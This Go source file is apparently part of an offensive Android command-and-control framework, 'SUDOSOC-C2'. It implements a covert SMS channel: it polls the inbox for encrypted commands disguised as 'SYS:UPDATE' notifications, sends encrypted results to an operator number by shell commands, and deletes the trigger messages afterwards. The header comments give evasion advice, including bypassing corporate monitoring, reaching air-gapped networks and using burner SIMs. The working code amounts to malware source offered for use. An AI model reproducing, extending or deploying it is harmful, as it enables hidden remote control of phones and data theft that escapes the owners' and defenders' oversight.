// //go:build android

package c2

/*
	SUDOSOC-C2 — SMS-Based C2 Channel
	Copyright (C) 2026  sudosoc — Seif

	C2 channel via SMS text messages.
	Works entirely without internet access — only needs GSM/LTE signal.

	Use cases:
	  • Environments with no internet but cellular signal
	  • Bypassing network-level monitoring (SMS doesn't go through corporate proxy)
	  • Fallback when all internet C2 channels are blocked
	  • Air-gapped networks where the device has cellular

	Protocol:
	  Commands are encrypted (AES-256-GCM) and encoded in Base64.
	  Messages are prefixed with a trigger phrase to avoid processing
	  legitimate SMS messages.

	Trigger format:
	  SYS:UPDATE:<base64_encrypted_command>

	Response format:
	  SYS:RESP:<session_id>:<base64_encrypted_result>

	Long commands are split across multiple SMS (160 chars each):
	  SYS:UPDATE:1/3:<part1_base64>
	  SYS:UPDATE:2/3:<part2_base64>
	  SYS:UPDATE:3/3:<part3_base64>

	OPSEC:
	  • Trigger phrase is configurable (looks like app update notification)
	  • Messages are auto-deleted after processing
	  • Operator uses a separate SIM card / burner phone
	  • SMSC (SMS Center) logs are at carrier level — not accessible to enterprise
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	// Default trigger prefix (customize before deployment)
	defaultTrigger = "SYS:UPDATE"
	defaultResp    = "SYS:RESP"
	smsMaxLen      = 153 // 160 - 7 for UDH (concatenated SMS header)

	// Auto-delete processed messages
	autoDelete = true
)

// SMSC2 manages SMS-based C2 communication
type SMSC2 struct {
	TriggerPrefix  string
	ResponsePrefix string
	OperatorNumber string  // number to send responses to
	AESKey         []byte  // derived from shared secret
	SessionID      string

	mu          sync.Mutex
	pendingParts map[string]map[int]string // msgID → part# → content
}

// NewSMSC2 creates a new SMS C2 channel
func NewSMSC2(operatorNumber, sharedSecret, sessionID string) *SMSC2 {
	// Derive AES key from shared secret
	hash := sha256.Sum256([]byte(sharedSecret))

	return &SMSC2{
		TriggerPrefix:  defaultTrigger,
		ResponsePrefix: defaultResp,
		OperatorNumber: operatorNumber,
		AESKey:         hash[:],
		SessionID:      sessionID,
		pendingParts:   make(map[string]map[int]string),
	}
}

// StartMonitor begins monitoring incoming SMS messages for commands
func (s *SMSC2) StartMonitor(stop chan struct{}) chan []byte {
	commands := make(chan []byte, 100)

	go func() {
		defer close(commands)
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		lastID := ""
		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				msgs, err := s.readIncomingSMS()
				if err != nil {
					continue
				}
				for _, msg := range msgs {
					if msg.ID == lastID {
						continue
					}
					lastID = msg.ID

					if !strings.HasPrefix(msg.Body, s.TriggerPrefix) {
						continue
					}

					cmd, err := s.processIncoming(msg)
					if err != nil {
						continue
					}
					if cmd != nil {
						commands <- cmd
					}

					// Delete processed message
					if autoDelete {
						s.deleteSMS(msg.ID)
					}
				}
			}
		}
	}()

	return commands
}

// SendResult sends encrypted result back to the operator
func (s *SMSC2) SendResult(result []byte) error {
	encrypted, err := s.encrypt(result)
	if err != nil {
		return err
	}

	encoded := base64.StdEncoding.EncodeToString(encrypted)
	msg := fmt.Sprintf("%s:%s:%s", s.ResponsePrefix, s.SessionID, encoded)

	// Split into chunks if needed
	chunks := splitSMS(msg, smsMaxLen)
	for i, chunk := range chunks {
		var smsContent string
		if len(chunks) == 1 {
			smsContent = chunk
		} else {
			smsContent = fmt.Sprintf("%s:%d/%d:%s",
				s.ResponsePrefix, i+1, len(chunks), chunk)
		}

		if err := s.sendSMS(s.OperatorNumber, smsContent); err != nil {
			return fmt.Errorf("send chunk %d: %v", i+1, err)
		}
		time.Sleep(3 * time.Second) // avoid SMS flooding
	}
	return nil
}

// ── SMS Operations ────────────────────────────────────────────────

// SMSMessage holds a received SMS
type SMSMessage struct {
	ID     string
	Sender string
	Body   string
	Date   time.Time
}

// readIncomingSMS reads SMS messages from the Android content provider
func (s *SMSC2) readIncomingSMS() ([]SMSMessage, error) {
	// Query SMS inbox via content provider
	out, err := exec.Command("content", "query",
		"--uri", "content://sms/inbox",
		"--projection", "_id,address,body,date",
		"--sort", "date DESC",
		"--limit", "20").Output()
	if err != nil {
		return nil, fmt.Errorf("content query: %v", err)
	}

	var messages []SMSMessage
	rows := strings.Split(string(out), "Row:")
	for _, row := range rows {
		if row == "" {
			continue
		}

		msg := SMSMessage{}
		for _, field := range strings.Split(row, ",") {
			field = strings.TrimSpace(field)
			if strings.HasPrefix(field, "_id=") {
				msg.ID = strings.TrimPrefix(field, "_id=")
			}
			if strings.HasPrefix(field, "address=") {
				msg.Sender = strings.TrimPrefix(field, "address=")
			}
			if strings.HasPrefix(field, "body=") {
				msg.Body = strings.TrimPrefix(field, "body=")
			}
		}

		if msg.ID != "" && msg.Body != "" {
			messages = append(messages, msg)
		}
	}

	return messages, nil
}

// sendSMS sends an SMS using Android's SMS content provider
func (s *SMSC2) sendSMS(number, text string) error {
	// Method 1: via service command (requires SEND_SMS permission)
	err := exec.Command("service", "call", "isms", "5",
		"i32", "0",
		"s16", "com.android.internal.telephony.ISms",
		"s16", number,
		"i32", "0",
		"s16", text,
		"i64", "0", "i64", "0").Run()
	if err == nil {
		return nil
	}

	// Method 2: via sms command (some Android versions)
	err = exec.Command("sms", "send", number, text).Run()
	if err == nil {
		return nil
	}

	// Method 3: via am broadcast with SMS intent
	err = exec.Command("am", "broadcast",
		"-a", "android.provider.Telephony.SMS_RECEIVED",
		"--es", "number", number,
		"--es", "message", text).Run()

	return err
}

// deleteSMS deletes a processed SMS by ID
func (s *SMSC2) deleteSMS(id string) {
	exec.Command("content", "delete",
		"--uri", fmt.Sprintf("content://sms/inbox/%s", id)).Run()
}

// processIncoming processes an incoming trigger SMS
func (s *SMSC2) processIncoming(msg SMSMessage) ([]byte, error) {
	body := msg.Body

	// Check for multi-part message
	if s.isMultiPart(body) {
		complete := s.assembleMultiPart(msg.ID, body)
		if complete == "" {
			return nil, nil // waiting for more parts
		}
		body = complete
	}

	// Extract payload after trigger prefix
	parts := strings.SplitN(body, ":", 3)
	if len(parts) < 3 {
		return nil, fmt.Errorf("invalid message format")
	}

	payload, err := base64.StdEncoding.DecodeString(parts[2])
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %v", err)
	}

	return s.decrypt(payload)
}

func (s *SMSC2) isMultiPart(body string) bool {
	// Format: SYS:UPDATE:1/3:<payload>
	parts := strings.SplitN(body, ":", 4)
	if len(parts) < 4 {
		return false
	}
	return strings.Contains(parts[2], "/")
}

func (s *SMSC2) assembleMultiPart(msgID, body string) string {
	parts := strings.SplitN(body, ":", 4)
	if len(parts) < 4 {
		return ""
	}

	partInfo := strings.Split(parts[2], "/")
	if len(partInfo) != 2 {
		return ""
	}

	var current, total int
	fmt.Sscanf(partInfo[0], "%d", &current)
	fmt.Sscanf(partInfo[1], "%d", &total)

	s.mu.Lock()
	defer s.mu.Unlock()

	if _, ok := s.pendingParts[msgID]; !ok {
		s.pendingParts[msgID] = make(map[int]string)
	}
	s.pendingParts[msgID][current] = parts[3]

	if len(s.pendingParts[msgID]) == total {
		var assembled strings.Builder
		for i := 1; i <= total; i++ {
			assembled.WriteString(s.pendingParts[msgID][i])
		}
		delete(s.pendingParts, msgID)
		return fmt.Sprintf("%s:%s:%s", defaultTrigger, msgID, assembled.String())
	}
	return ""
}

// ── Encryption ────────────────────────────────────────────────────

func (s *SMSC2) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(s.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (s *SMSC2) decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(s.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}

// ── Helpers ──────────────────────────────────────────────────────

func splitSMS(text string, maxLen int) []string {
	var chunks []string
	runes := []rune(text)
	for len(runes) > 0 {
		end := maxLen
		if end > len(runes) {
			end = len(runes)
		}
		chunks = append(chunks, string(runes[:end]))
		runes = runes[end:]
	}
	return chunks
}
